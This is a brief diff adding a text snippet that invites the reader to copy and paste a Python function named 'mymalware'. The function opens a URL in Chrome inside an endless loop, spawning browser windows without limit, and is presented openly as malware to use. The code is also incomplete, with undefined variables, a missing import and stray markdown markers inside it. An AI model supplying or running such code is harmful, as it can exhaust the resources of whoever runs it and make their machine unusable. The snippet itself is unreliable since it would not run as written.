@@ -1,0 +1,8 @@
+So all you have to do is cut and copy paste this line of code.
+
+**def mymalware():
+    while True:
+
+        webbrowser.register('chrome', None,  
+                    webbrowser.BackgroundBrowser(chrome_path)) 
+        webbrowser.get('chrome').open(url)**
